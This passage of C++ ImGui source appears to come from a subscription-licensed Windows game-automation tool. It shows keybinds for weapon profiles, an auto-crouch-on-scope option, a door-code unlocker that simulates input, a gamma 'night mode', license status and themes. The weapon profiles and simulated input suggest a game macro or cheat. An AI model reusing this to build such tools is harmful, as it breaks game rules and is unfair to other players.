                            g_is_capturing_keybind.store(true, std::memory_order_relaxed);
                            g_profile_being_rebound = "EXIT_APP";
                            output_log_message("Capturing keybind for Exit App...\n");
                        }
                        ImGui::SameLine();
                        ImGui::Text("%s", vk_code_to_string(g_exit_app_key.load(std::memory_order_relaxed)).c_str());
                    }

                    ImGui::Separator();

                    // Display and allow changing LMB/RMB keybinds
                    ImGui::Text("Left Mouse Button:");
                    ImGui::SameLine(180); // Adjusted alignment
                    if (g_is_capturing_keybind.load(std::memory_order_relaxed) && g_profile_being_rebound == "LMB") {
                        ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(1.0f, 0.5f, 0.0f, 1.0f)); // Orange color
                        ImGui::PushStyleColor(ImGuiCol_ButtonHovered, ImVec4(1.0f, 0.6f, 0.2f, 1.0f)); // Lighter orange on hover
                        ImGui::PushStyleColor(ImGuiCol_ButtonActive, ImVec4(1.0f, 0.7f, 0.3f, 1.0f)); // Even lighter orange when active
                        ImGui::Button("Press a key button..."); // Button text changes while capturing
                        ImGui::PopStyleColor(3); // Pop the 3 color styles
                    } else {
                        if (ImGui::Button("Change##LMB")) {
                            g_is_capturing_keybind.store(true, std::memory_order_relaxed);
                            g_profile_being_rebound = "LMB";
                            output_log_message("Capturing keybind for LMB...\n");
                        }
                        ImGui::SameLine();
                        ImGui::Text("%s", vk_code_to_string(g_lmb_key.load(std::memory_order_relaxed)).c_str());
                    }

                    ImGui::Text("Right Mouse Button:");
                    ImGui::SameLine(180); // Adjusted alignment
                    if (g_is_capturing_keybind.load(std::memory_order_relaxed) && g_profile_being_rebound == "RMB") {
                        ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(1.0f, 0.5f, 0.0f, 1.0f)); // Orange color
                        ImGui::PushStyleColor(ImGuiCol_ButtonHovered, ImVec4(1.0f, 0.6f, 0.2f, 1.0f)); // Lighter orange on hover
                        ImGui::PushStyleColor(ImGuiCol_ButtonActive, ImVec4(1.0f, 0.7f, 0.3f, 1.0f)); // Even lighter orange when active
                        ImGui::Button("Press a key button..."); // Button text changes while capturing
                        ImGui::PopStyleColor(3); // Pop the 3 color styles
                    } else {
                        if (ImGui::Button("Change##RMB")) {
                            g_is_capturing_keybind.store(true, std::memory_order_relaxed);
                            g_profile_being_rebound = "RMB";
                            output_log_message("Capturing keybind for RMB...\n");
                        }
                        ImGui::SameLine();
                        ImGui::Text("%s", vk_code_to_string(g_rmb_key.load(std::memory_order_relaxed)).c_str());
                    }

                    // --- Night Mode Keybind --- 
                    ImGui::Text("Night Mode Key:");
                    ImGui::SameLine(180); // Adjusted alignment
                    if (g_is_capturing_keybind.load(std::memory_order_relaxed) && g_profile_being_rebound == "NIGHT_MODE_KEY") {
                        ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(1.0f, 0.5f, 0.0f, 1.0f)); // Orange color
                        ImGui::PushStyleColor(ImGuiCol_ButtonHovered, ImVec4(1.0f, 0.6f, 0.2f, 1.0f)); // Lighter orange on hover
                        ImGui::PushStyleColor(ImGuiCol_ButtonActive, ImVec4(1.0f, 0.7f, 0.3f, 1.0f)); // Even lighter orange when active
                        ImGui::Button("Press a key..."); // Button text changes while capturing
                        ImGui::PopStyleColor(3); // Pop the 3 color styles
                    } else {
                        if (ImGui::Button("Change##NightModeKey")) {
                            g_is_capturing_keybind.store(true, std::memory_order_relaxed);
                            g_profile_being_rebound = "NIGHT_MODE_KEY";
                            output_log_message("Capturing keybind for Night Mode...\n");
                        }
                        ImGui::SameLine();
                        ImGui::Text("%s", vk_code_to_string(g_nightModeKey.load(std::memory_order_relaxed)).c_str());
                    }
                    ImGui::Separator();
                    ImGui::Text("Weapon Selection Keybinds:");
                    ImGui::Separator();

                    // Display and allow changing keybinds for each weapon profile
                    {
                        std::lock_guard<std::mutex> lock(profile_mutex); // Lock while accessing g_profile_keybinds
                        for (const auto& profile_name : ALL_PROFILES) {
                            int current_vk = g_profile_keybinds.count(profile_name) ? g_profile_keybinds.at(profile_name) : 0;
                            std::string current_key_name = vk_code_to_string(current_vk);

                            ImGui::Text("%s:", profile_name.c_str());
                            ImGui::SameLine(180); // Adjusted alignment

                            // Check if this profile is currently being rebound
                            if (g_is_capturing_keybind.load(std::memory_order_relaxed) && g_profile_being_rebound == "DOOR_UNLOCK_TRIGGER") { // Corrected check
                                // If capturing the Door Unlock Trigger, this button should not be active
                                ImGui::TextDisabled("Change"); // Display disabled text instead of button
                                ImGui::SameLine();
                                ImGui::Text("%s", current_key_name.c_str());
                            }
                            else if (g_is_capturing_keybind.load(std::memory_order_relaxed) && g_profile_being_rebound == profile_name) {
                                ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(1.0f, 0.5f, 0.0f, 1.0f)); // Orange color
                                ImGui::PushStyleColor(ImGuiCol_ButtonHovered, ImVec4(1.0f, 0.6f, 0.2f, 1.0f)); // Lighter orange on hover
                                ImGui::PushStyleColor(ImGuiCol_ButtonActive, ImVec4(1.0f, 0.7f, 0.3f, 1.0f)); // Even lighter orange when active
                                ImGui::Button("Press a key..."); // Button text changes while capturing
                                ImGui::PopStyleColor(3); // Pop the 3 color styles
                            } else {
                                // Display current key and a button to change it
                                if (ImGui::Button(("Change##" + profile_name).c_str())) {
                                    // Start capturing keybind for this profile
                                    g_is_capturing_keybind.store(true, std::memory_order_relaxed);
                                    g_profile_being_rebound = profile_name;
                                    output_log_message("Capturing keybind for " + profile_name + "...\n");
                                }
                                ImGui::SameLine();
                                ImGui::Text("%s", current_key_name.c_str()); 
                            }
                        }
                    } // Mutex released

                    ImGui::Separator();

                    // --- Auto Crouch Scope Option ---
                    bool auto_crouch_scope_enabled = g_auto_crouch_scope_enabled.load();
                    if (ImGui::Checkbox("Auto Crouch Scope", &auto_crouch_scope_enabled)) {
                        g_auto_crouch_scope_enabled.store(auto_crouch_scope_enabled);
                        // Set feedback message for toggling Auto Crouch Scope
                        g_feedback_message = auto_crouch_scope_enabled ? "Auto Crouch Scope Enabled!" : "Auto Crouch Scope Disabled!";
                        g_feedback_message_end_time = std::chrono::steady_clock::now() + std::chrono::seconds(3);
                    }
                    ImGui::SameLine();
                    HelpMarker("When enabled, pressing right button (scope) will automatically press CTRL (crouch) as well.");

                    ImGui::Separator();

                    // --- Buttons for Reset and Save (Swapped Order) ---
                    // Reset Keybinds Button (Left)
                    ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(1.0f, 0.0f, 0.0f, 1.0f)); // Red color
                    ImGui::PushStyleColor(ImGuiCol_ButtonHovered, ImVec4(1.0f, 0.2f, 0.2f, 1.0f)); // Lighter red on hover
                    ImGui::PushStyleColor(ImGuiCol_ButtonActive, ImVec4(1.0f, 0.4f, 0.4f, 1.0f)); // Even lighter red when active
                    if (ImGui::Button("Reset Keybinds")) {
                        ImGui::OpenPopup("Confirm Reset"); // Open confirmation popup
                    }
                    ImGui::PopStyleColor(3); // Pop the 3 color styles

                    ImGui::SameLine(); // Place the Save button next to Reset

                    // Save Keybinds Button (Right)
                    if (ImGui::Button("Save Keybinds")) {
                        save_config(); // Save the entire config, including updated keybinds
                        output_log_message("Keybinds saved via UI button.\n");
                        // Set feedback message for saving
                        g_feedback_message = "Keybinds Saved!"; // Changed message
                        g_feedback_message_end_time = std::chrono::steady_clock::now() + std::chrono::seconds(3); // Show for 3 seconds
                    }


                    // Confirmation Popup for Reset
                    if (ImGui::BeginPopupModal("Confirm Reset", NULL, ImGuiWindowFlags_AlwaysAutoResize)) {
                        ImGui::Text("Are you sure you want to reset all keybinds to default?");
                        ImGui::Spacing();
                        ImGui::Separator();
                        ImGui::Spacing();

                        ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(1.0f, 0.0f, 0.0f, 1.0f)); // Red color
                        ImGui::PushStyleColor(ImGuiCol_ButtonHovered, ImVec4(1.0f, 0.2f, 0.2f, 1.0f)); // Lighter red on hover
                        ImGui::PushStyleColor(ImGuiCol_ButtonActive, ImVec4(1.0f, 0.4f, 0.4f, 1.0f)); // Even lighter red when active
                        if (ImGui::Button("Yes, Reset", ImVec2(120, 0))) {
                            reset_keybinds_to_defaults(); // Perform the reset
                            save_config(); // Optionally save immediately after reset
                            output_log_message("Keybinds reset confirmed and saved.\n");
                            ImGui::CloseCurrentPopup(); // Close the popup
                        }
                        ImGui::PopStyleColor(3); // Pop the 3 color styles

                        ImGui::SameLine();
                        if (ImGui::Button("Cancel", ImVec2(120, 0))) {
                            ImGui::CloseCurrentPopup(); // Close the popup without resetting
                        }
                        ImGui::EndPopup(); // Corrected: Use EndPopup() to close the modal
                    }


                } else if (current_view == ViewState::DoorUnlocker) {
                    // --- Door Unlocker View Content ---
                    ImGui::Text("Door Unlocker Feature");
                    ImGui::Separator();
                    ImGui::TextWrapped("Configure the door code (max 4 digits) and the  button to trigger the sequence.");
                    ImGui::Spacing();

                    // Input for Door Code
                    ImGui::PushItemWidth(150);
                    // Input text for the code (allow only digits)
                    // The buffer is static and initialized once at startup.
                    // We update g_door_unlock_code from the buffer below.
                    // Use max_len = 5 to allow 4 digits + null terminator
                    if (ImGui::InputText("Door Code", door_code_buffer, 5, ImGuiInputTextFlags_CharsDecimal)) {
                        // Input changed
                        try {
                            // Parse the buffer. stoi handles empty string or strings with only digits.
                            g_door_unlock_code = (strlen(door_code_buffer) > 0) ? std::stoi(door_code_buffer) : 0;
                            // Clamp the value to the valid range (0-9999)
                            g_door_unlock_code = std::max(0, std::min(9999, g_door_unlock_code));
                            // Note: The buffer is already limited to 4 digits by max_len=5,
                            // so entered_code will naturally be <= 9999 if it's a valid number.
                            // The clamping is mostly defensive programming.
                        } catch (...) {
                            // Should not happen with CharsDecimal and max_len=5, but handle gracefully.
                            // If parsing fails (e.g., unexpected state), revert buffer to current code.
                            snprintf(door_code_buffer, sizeof(door_code_buffer), "%d", g_door_unlock_code);
                        }
                    }
                    ImGui::PopItemWidth();

                    ImGui::Spacing();

                    // Button to capture Trigger Key
                    ImGui::Text("Trigger Mouse Button:");
                    ImGui::SameLine(180); // Adjusted alignment

                    // Check if we are currently capturing the trigger key
                    if (g_is_capturing_keybind.load(std::memory_order_relaxed) && g_profile_being_rebound == "DOOR_UNLOCK_TRIGGER") {
                        ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(1.0f, 0.5f, 0.0f, 1.0f)); // Orange color
                        ImGui::PushStyleColor(ImGuiCol_ButtonHovered, ImVec4(1.0f, 0.6f, 0.2f, 1.0f)); // Lighter orange on hover
                        ImGui::PushStyleColor(ImGuiCol_ButtonActive, ImVec4(1.0f, 0.7f, 0.3f, 1.0f)); // Even lighter orange when active
                        ImGui::Button("Press a button..."); // Button text changes while capturing
                        ImGui::PopStyleColor(3); // Pop the 3 color styles
                    } else {
                        // Display current key and a button to change it
                        if (ImGui::Button("Change##DoorUnlockTrigger")) {
                            // Start capturing keybind for the trigger
                            g_is_capturing_keybind.store(true, std::memory_order_relaxed);
                            g_profile_being_rebound = "DOOR_UNLOCK_TRIGGER"; // Use a unique identifier
                            output_log_message("Capturing keybind for Door Unlock Trigger...\n");
                        }
                        ImGui::SameLine();
                        ImGui::Text("%s", vk_code_to_string(g_door_unlock_trigger_key).c_str());
                    }

                    ImGui::Separator();

                    // Save Button
                    if (ImGui::Button("Save Door Unlock Settings")) {
                        save_config(); // Save the entire config
                        output_log_message("Door Unlock settings saved.\n");
                        // Set feedback message for saving
                        g_feedback_message = "Door Unlock Settings Saved!"; // Changed message
                        g_feedback_message_end_time = std::chrono::steady_clock::now() + std::chrono::seconds(3); // Show for 3 seconds
                    }

                    ImGui::Spacing();
                    ImGui::TextWrapped("Note: The Door Unlocker sequence simulates pressing 'E', moving the , clicking LMB, releasing 'E', and then typing the 4-digit code.");
                    ImGui::TextWrapped("Ensure your game is focused and ready before triggering.");

                } else if (current_view == ViewState::Subscription) { // Renamed Support to Subscription
                     // --- Subscription View Content ---
                     ImGui::Text("Subscription Information"); // Updated text
                     ImGui::Separator();

                      // --- خواندن امن داده‌های لایسنس ---
                     std::string start_license_display;
                     long long duration_display;
                     std::chrono::system_clock::time_point activation_time_display;
                     int local_license_used_count = -1; // Initialize to default
                     std::string plan_type_display;
                     {

                     std::lock_guard<std::mutex> lock(g_license_data_mutex); // قفل کردن قبل از خواندن داده‌های مشترک
                         start_license_display = g_start_license_str; // خواندن تاریخ شروع
                         duration_display = g_subscription_duration_seconds; // خواندن مدت زمان
                         activation_time_display = g_activation_time; // خواندن زمان فعال‌سازی
                         local_license_used_count = g_license_used_count; // خواندن تعداد استفاده شده
                         plan_type_display = g_plan_type; // خواندن نوع پلن از سرور
                     }
                     // --- پایان خواندن امن ---
                     
                      // نمایش وضعیت لایسنس
                     ImGui::Text("License Status: "); ImGui::SameLine();

                     auto now_sub = std::chrono::system_clock::now();
                     // استفاده از مقادیر محلی خوانده شده برای محاسبه زمان انقضا
                     auto expiration_time_sub = activation_time_display + std::chrono::seconds(duration_display);
                     auto remaining_duration_sub = expiration_time_sub - now_sub;
                     auto remaining_seconds_sub = std::chrono::duration_cast<std::chrono::seconds>(remaining_duration_sub).count();


                     if (!is_licensed.load() || now_sub >= expiration_time_sub) {
                         ImGui::TextColored(ImVec4(1.0f, 0.0f, 0.0f, 1.0f), "Inactive"); // Red
                     } else {
                         // Check remaining time for color coding
                         if (remaining_seconds_sub <= 3600) { // 1 hour or less
                             ImGui::TextColored(ImVec4(1.0f, 0.0f, 0.0f, 1.0f), "Active (Expires Very Soon)"); // red
                         } else if (remaining_seconds_sub <= 24 * 3600) { // 1 day or less
                             ImGui::TextColored(ImVec4(1.0f, 1.0f, 0.0f, 1.0f), "Active (Expires Soon)"); // Yellow
                         } else {
                             ImGui::TextColored(ImVec4(0.0f, 1.0f, 0.0f, 1.0f), "Active"); // Green
                         }
                     }

                    const char* plan_label = "Unknown";
                    if (plan_type_display == "free_trial") {
                        plan_label = "Free Trial";
                    } else if (plan_type_display == "subscription") {
                        plan_label = "Subscription";
                    }

                     // نمایش لیبل Plan Type بدون رنگ خاص، ولی مقدار را رنگی می‌کنیم
                     ImGui::Text("Plan Type:");
                     ImGui::SameLine();

                     ImVec4 plan_color(1.0f, 1.0f, 1.0f, 1.0f);
                     if (plan_type_display == "free_trial") {
                         plan_color = ImVec4(0.80f, 0.50f, 0.20f, 1.0f); // Bronze
                     } else if (plan_type_display == "subscription") {
                         plan_color = ImVec4(1.0f, 0.84f, 0.0f, 1.0f); // Gold
                     }
                     ImGui::TextColored(plan_color, "%s", plan_label);

                     // نمایش تاریخ شروع لایسنس از متغیر خوانده شده
                     ImGui::Text("Start License Date: %s", start_license_display.c_str());

                     // Display original duration based on seconds
                    ImGui::Text("Subscription Duration: %s", format_duration_seconds(duration_display).c_str());


                    // Calculate and display remaining time
                    std::string remaining_time_str = calculate_remaining_duration_string(activation_time_display, duration_display);
                    ImGui::Text("Remaining Time: %s", remaining_time_str.c_str());

                    // Display total usage time across all sessions (شامل سشن فعلی)
                    long long total_usage_display = g_total_usage_seconds;
                    if (g_isLoggedIn.load(std::memory_order_relaxed) &&
                        g_session_start_time.time_since_epoch().count() != 0) {
                        auto now_usage = std::chrono::steady_clock::now();
                        auto delta_usage = std::chrono::duration_cast<std::chrono::seconds>(now_usage - g_session_start_time).count();
                        if (delta_usage > 0) {
                            total_usage_display += delta_usage;
                        }
                    }
                    ImGui::Text("Total Usage: %s", format_duration_seconds(total_usage_display).c_str());

                     // نمایش تعداد استفاده شده (used_count)
                     if (plan_type_display == "free_trial") {
                         ImGui::Text("Times Used: Not tracked for Free Trial");
                     } else if (local_license_used_count >= 0) {
                         ImGui::Text("Times Used: %d", local_license_used_count);
                     } else {
                         ImGui::Text("Times Used: N/A");
                     }


                     ImGui::Separator();
                     ImGui::TextWrapped("This page shows your current subscription details.");

                     // Add the "Change Subscription" button
                     if (ImGui::Button("Change Subscription")) {
                         current_view = ViewState::Login; // Go back to login
                         license_key_input[0] = '\0'; // Clear the input field
                         {
                             std::lock_guard<std::mutex> lock(g_login_error_mutex);
                             login_error_message = ""; // Clear any error message
                         }
                         is_licensed.store(false); // Mark as unlicensed until new key is entered
                         // DO NOT SAVE LICENSE STATE HERE
                         output_log_message("Navigating to Login to change subscription.\n");
                     }

                     // Moved Code by and Discord lines to About Me
                } else if (current_view == ViewState::AboutMe) {
                     // --- About Me View Content ---
                     ImGui::Text("About Me");
                     ImGui::Separator();
                     ImGui::TextWrapped("Version %s", APP_VERSION_NUMBER.c_str());
                     ImGui::TextWrapped("Stats: Active ");
                     // --- Start: Making Discord name clickable ---
                     ImGui::Text("Discord:"); // Display the "Discord:" label
                     ImGui::SameLine(); // Keep the next item on the same line

                     // Set the text color to look like a link (e.g., blue)
                     ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(0.2f, 0.6f, 1.0f, 1.0f)); // Example blue color

                     // Display the username text
                     ImGui::Text("https://discord.gg/f7qQbGwFwZ");

                     // Reset text color to default
                     ImGui::PopStyleColor();

                     // Check if the last item (the text "") was hovered or clicked
                     if (ImGui::IsItemHovered()) {
                         // Optional: Change cursor to hand when hovered over the link
                         // ImGui::SetMouseCursor(ImGuiMouseCursor_Hand); // Requires setting  cursor globally based on hovered item

                         // Display a tooltip when hovered
                         ImGui::SetTooltip("Click to open Discord");
                     }

                     if (ImGui::IsItemClicked()) {
                         // Define the URL you want to open
                         // Replace "YOUR_DISCORD_LINK_HERE" with the actual URL
                         // This could be a Discord profile link (e.g., https://discord.com/users/YOUR_USER_ID)
                         // or a server invite link (e.g., https://discord.gg/YOUR_INVITE_CODE)
                         const char* discord_url = "https://discord.gg/f7qQbGwFwZ"; // Example invite link (replace with your actual link)

                         // Use ShellExecute to open the URL in the default browser
                         ShellExecute(0, "open", discord_url, 0, 0, SW_SHOW);

                         // Log the action (optional)
                         output_log_message("Opened Discord link: " + std::string(discord_url) + "\n");
                     }
                      // --- End: Making Discord name clickable ---

                      // --- Start: Last Update Section ---
                      ImGui::Separator(); // جداکننده بین لینک دیسکورد و بخش Last Update
                      
                      ImGui::Text("Last Update:"); // عنوان بخش
                      ImGui::SameLine();
                      ImGui::TextColored(ImVec4(0.0f, 1.0f, 1.0f, 1.0f), "2026-01-02"); // تاریخ آخرین به‌روزرسانی با رنگ فیروزه‌ای
                      
                      ImGui::TextWrapped("- Added Auto Crouch Scope feature");
                      ImGui::TextWrapped("- Added Night Mode System button");
                      ImGui::TextWrapped("- Fixed minor bugs and improved performance");
                      // --- End: Last Update Section ---

                  } else if (current_view == ViewState::Settings) {
                      // --- Settings View Content ---
                      ImGui::Text("Settings");
                      ImGui::Separator();
                      
                      ImGui::Text("Theme Settings");
                      ImGui::Separator();
                      
                      // Background Color Picker
                      bool bg_changed = ImGui::ColorEdit4("Background Color", (float*)&g_theme_settings.background_color, ImGuiColorEditFlags_AlphaBar);
                      
                      // Text Color Picker
                      bool text_changed = ImGui::ColorEdit4("Text Color", (float*)&g_theme_settings.text_color, ImGuiColorEditFlags_AlphaBar);
                      
                      // Button Colors
                      bool btn_changed = ImGui::ColorEdit4("Button Color", (float*)&g_theme_settings.button_color, ImGuiColorEditFlags_AlphaBar);
                      bool btn_hover_changed = ImGui::ColorEdit4("Button Hover Color", (float*)&g_theme_settings.button_hovered_color, ImGuiColorEditFlags_AlphaBar);
                      bool btn_active_changed = ImGui::ColorEdit4("Button Active Color", (float*)&g_theme_settings.button_active_color, ImGuiColorEditFlags_AlphaBar);
                      
                      // Header Color
                      bool header_changed = ImGui::ColorEdit4("Header Color", (float*)&g_theme_settings.header_color, ImGuiColorEditFlags_AlphaBar);
                      
                      // If any color was changed, apply the theme immediately
                      if (bg_changed || text_changed || btn_changed || btn_hover_changed || btn_active_changed || header_changed) {
                          apply_theme();
                      }
                      
                      ImGui::Separator();
                      
                      // Preset Themes
                      ImGui::Text("Preset Themes");
                      
                      if (ImGui::Button("Dark Theme")) {
                          // Dark theme
                          g_theme_settings.background_color = ImVec4(0.17f, 0.17f, 0.17f, 1.00f);
                          g_theme_settings.text_color = ImVec4(1.00f, 1.00f, 1.00f, 1.00f);
                          g_theme_settings.button_color = ImVec4(0.14f, 0.14f, 0.14f, 1.00f);
                          g_theme_settings.button_hovered_color = ImVec4(0.24f, 0.24f, 0.24f, 1.00f);
                          g_theme_settings.button_active_color = ImVec4(0.34f, 0.34f, 0.34f, 1.00f);
                          g_theme_settings.header_color = ImVec4(0.20f, 0.20f, 0.20f, 1.00f);
                          apply_theme();
                          // Set feedback message
                          g_feedback_message = "Dark Theme Applied!";
                          g_feedback_message_end_time = std::chrono::steady_clock::now() + std::chrono::seconds(3); // Show for 3 seconds
                      }
                      
                      ImGui::SameLine();
                      
                      if (ImGui::Button("Light Theme")) {
                          // Light theme
                          g_theme_settings.background_color = ImVec4(0.90f, 0.90f, 0.90f, 1.00f);
                          g_theme_settings.text_color = ImVec4(0.10f, 0.10f, 0.10f, 1.00f);
                          g_theme_settings.button_color = ImVec4(0.80f, 0.80f, 0.80f, 1.00f);
                          g_theme_settings.button_hovered_color = ImVec4(0.70f, 0.70f, 0.70f, 1.00f);
                          g_theme_settings.button_active_color = ImVec4(0.60f, 0.60f, 0.60f, 1.00f);
                          g_theme_settings.header_color = ImVec4(0.75f, 0.75f, 0.75f, 1.00f);
                          apply_theme();
                          // Set feedback message
                          g_feedback_message = "Light Theme Applied!";
                          g_feedback_message_end_time = std::chrono::steady_clock::now() + std::chrono::seconds(3); // Show for 3 seconds
                      }
                      
                      ImGui::SameLine();
                      
                      if (ImGui::Button("Blue Theme")) {
                          // Blue theme
                          g_theme_settings.background_color = ImVec4(0.10f, 0.15f, 0.20f, 1.00f);
                          g_theme_settings.text_color = ImVec4(0.90f, 0.90f, 1.00f, 1.00f);
                          g_theme_settings.button_color = ImVec4(0.15f, 0.25f, 0.35f, 1.00f);
                          g_theme_settings.button_hovered_color = ImVec4(0.25f, 0.35f, 0.45f, 1.00f);
                          g_theme_settings.button_active_color = ImVec4(0.35f, 0.45f, 0.55f, 1.00f);
                          g_theme_settings.header_color = ImVec4(0.20f, 0.30f, 0.40f, 1.00f);
                          apply_theme();
                          // Set feedback message
                          g_feedback_message = "Blue Theme Applied!";
                          g_feedback_message_end_time = std::chrono::steady_clock::now() + std::chrono::seconds(3); // Show for 3 seconds
                      }
                      
                      ImGui::SameLine();
                                            if (ImGui::Button("Gaming Theme")) {
                          // Gaming theme (Purple theme from SetCustomTheme)
                          g_theme_settings.background_color = ImVec4(0.10f, 0.10f, 0.15f, 0.95f);
                          g_theme_settings.text_color = ImVec4(1.00f, 1.00f, 1.00f, 1.00f);
                          g_theme_settings.button_color = ImVec4(0.35f, 0.25f, 0.65f, 0.59f);
                          g_theme_settings.button_hovered_color = ImVec4(0.50f, 0.30f, 0.80f, 0.80f);
                          g_theme_settings.button_active_color = ImVec4(0.60f, 0.35f, 0.90f, 1.00f);
                          g_theme_settings.header_color = ImVec4(0.40f, 0.25f, 0.70f, 0.45f);
                          apply_theme();
                          // Set feedback message
                          g_feedback_message = "Gaming Theme Applied!";
                          g_feedback_message_end_time = std::chrono::steady_clock::now() + std::chrono::seconds(3); // Show for 3 seconds
                      }
                      
                      ImGui::SameLine();
                      
                      if (ImGui::Button("Sport Theme")) {
                          // Sport theme (Green theme from SetSportTheme)
                          SetSportTheme();
                          // Update theme settings to match the sport theme
                          g_theme_settings.background_color = ImVec4(0.05f, 0.15f, 0.10f, 0.95f);
                          g_theme_settings.text_color = ImVec4(1.00f, 1.00f, 1.00f, 1.00f);
                          g_theme_settings.button_color = ImVec4(0.25f, 0.65f, 0.35f, 0.59f);
                          g_theme_settings.button_hovered_color = ImVec4(0.30f, 0.80f, 0.40f, 0.80f);
                          g_theme_settings.button_active_color = ImVec4(0.35f, 0.90f, 0.45f, 1.00f);
                          g_theme_settings.header_color = ImVec4(0.25f, 0.40f, 0.30f, 0.45f);
                          apply_theme();
                          // Set feedback message
                          g_feedback_message = "Sport Theme Applied!";
                          g_feedback_message_end_time = std::chrono::steady_clock::now() + std::chrono::seconds(3); // Show for 3 seconds
                      }
                      
                      // Reset Button
                      ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(1.0f, 0.0f, 0.0f, 1.0f)); // Red color
                      ImGui::PushStyleColor(ImGuiCol_ButtonHovered, ImVec4(1.0f, 0.2f, 0.2f, 1.0f)); // Lighter red on hover
                      ImGui::PushStyleColor(ImGuiCol_ButtonActive, ImVec4(1.0f, 0.4f, 0.4f, 1.0f)); // Even lighter red when active
                      if (ImGui::Button("Reset to Default")) {
                          // Reset to default gaming theme
                          g_theme_settings.background_color = ImVec4(0.10f, 0.10f, 0.15f, 0.95f);
                          g_theme_settings.text_color = ImVec4(1.00f, 1.00f, 1.00f, 1.00f);
                          g_theme_settings.button_color = ImVec4(0.35f, 0.25f, 0.65f, 0.59f);
                          g_theme_settings.button_hovered_color = ImVec4(0.50f, 0.30f, 0.80f, 0.80f);
                          g_theme_settings.button_active_color = ImVec4(0.60f, 0.35f, 0.90f, 1.00f);
                          g_theme_settings.header_color = ImVec4(0.40f, 0.25f, 0.70f, 0.45f);
                          apply_theme();
                          save_config(); // Save the default theme settings to config
                          // Set feedback message for resetting
                          g_feedback_message = "Theme Reset to Default!";
                          g_feedback_message_end_time = std::chrono::steady_clock::now() + std::chrono::seconds(3); // Show for 3 seconds
                      }
                      ImGui::PopStyleColor(3); // Pop the 3 color styles
                      
                      ImGui::SameLine();
                       
                       // Save Button
                       if (ImGui::Button("Save Theme")) {
                           save_config(); // Save the current theme settings to config
                           // Set feedback message for saving
                           g_feedback_message = "Theme Settings Saved!";
                           g_feedback_message_end_time = std::chrono::steady_clock::now() + std::chrono::seconds(3); // Show for 3 seconds
                       }
                       ImGui::Separator();
                       
                       // --- Sound Settings ---
                      ImGui::Text("Sound Settings");
                                              // Checkbox to toggle sound
                        if (ImGui::Checkbox("Enable Sounds", &sound_enabled_local)) {
                            g_sound_enabled.store(sound_enabled_local, std::memory_order_relaxed); // Update atomic state
                            // ذخیره خودکار تنظیمات در صورت فعال بودن قابلیت Auto Save
                            AutoSaveIfEnabled();
                        }
                       ImGui::SameLine(); HelpMarker("Toggle all application sounds.");
                       
                       ImGui::Separator();
                       
                       // --- Auto Save Settings ---
                      ImGui::Text("Auto Save Settings");
                       
                       // Checkbox to toggle auto save
                       bool auto_save_local = AUTO_SAVE_ENABLED;
                       if (ImGui::Checkbox("Enable Auto Save", &auto_save_local)) {
                           AUTO_SAVE_ENABLED = auto_save_local;
                           
                           // نمایش پیام بازخورد به کاربر
                           if (AUTO_SAVE_ENABLED) {
                               show_feedback_message("Auto Save Enabled - Settings will be saved automatically");
                               save_config(); // ذخیره تنظیمات فعلی
                           } else {
                               show_feedback_message("Auto Save Disabled - You need to save settings manually");
                           }
                       }
                       ImGui::SameLine(); HelpMarker("When enabled, settings will be saved automatically when changed. When disabled, you need to click Save Keybinds button.");
                       
                       // نمایش دکمه ذخیره تنظیمات فقط در صورتی که Auto Save غیرفعال باشد
                       if (!AUTO_SAVE_ENABLED) {
                           if (ImGui::Button("Save Keybinds", ImVec2(120, 0))) {
                               save_config();
                               show_feedback_message("Settings saved manually");
                           }
                           ImGui::SameLine(); HelpMarker("Save all settings including keybinds to config file.");
                       }
                       // متن اضافی حذف شد
                  } // End of Settings view
            } // End licensed and valid content

            // --- Display Visual Feedback Message (Moved outside view-specific blocks) ---
            if (g_ui_notice_active.load(std::memory_order_relaxed)) {
                std::string title;
                std::string msg;
                std::string details;
                UINoticeLevel level;
                {
                    std::lock_guard<std::mutex> lock(g_ui_notice_mutex);
                    title = g_ui_notice_title;
                    msg = g_ui_notice_message;
                    details = g_ui_notice_details;
                    level = g_ui_notice_level;
                }

                ImVec4 color(1.0f, 1.0f, 1.0f, 1.0f);
                if (level == UINoticeLevel::Warning) {
                    color = ImVec4(1.0f, 0.84f, 0.0f, 1.0f);
                } else if (level == UINoticeLevel::Error) {
                    color = ImVec4(1.0f, 0.25f, 0.25f, 1.0f);
                }

                ImGui::Spacing();
                if (!title.empty()) {
                    ImGui::TextColored(color, "%s", title.c_str());
                }
                if (!msg.empty()) {
                    ImGui::TextWrapped("%s", msg.c_str());
                }
                if (ImGui::Button("Dismiss")) {
                    clear_ui_notice();
                }
                ImGui::Separator();
            }

            if (!g_feedback_message.empty() && std::chrono::steady_clock::now() < g_feedback_message_end_time) {
                ImGui::Spacing(); // Add some space before the message
                ImGui::TextColored(ImVec4(0.0f, 1.0f, 0.0f, 1.0f), "%s", g_feedback_message.c_str()); // Green text
            } else {
                g_feedback_message = ""; // Clear message if time is up
            }
            ImGui::End(); // End main config window

            // If ImGui::Begin updated show_config_window_local (e.e., user clicked X), update the atomic and hide the native window
            // Note: With NoTitleBar and NoClose, this block will only be entered if show_config_window_local was set to false by the Home key hook.
            if (!show_config_window_local && show_config_window_atomic.load(std::memory_order_relaxed)) {
                 show_config_window_atomic.store(false, std::memory_order_relaxed);
                 if (hwnd) {
                     ::ShowWindow(hwnd, SW_HIDE);
                 }
            }
        } else {
             // If the window is hidden, we still need to end the ImGui frame
             ImGui::EndFrame();

             // We also need to check if the atomic was changed by the hook to show the window again.
             if (show_config_window_atomic.load(std::memory_order_relaxed)) {
                 show_config_window_local = true; // Synchronize local state to show the window next frame
                 if (hwnd) {
                     ::ShowWindow(hwnd, SW_SHOW);
                 }
             }
             // No explicit sleep needed here anymore because WaitMessage handles yielding.
        }
        // If an update has completed and exit was requested, break out of the loop
        if (g_exit_after_update.load(std::memory_order_relaxed)) {
            done = true;
        }

        if (done) break;

        // --- Rendering ---
        // Only perform rendering if the window is visible
        if (show_config_window_local)
        {
            // Gamma/Brightness Toggle Logic (Night Mode)
            bool nightModeKeyCurrentlyPressed = (GetAsyncKeyState(g_nightModeKey) & 0x8000) != 0;
            if (!keyboard_hook) {
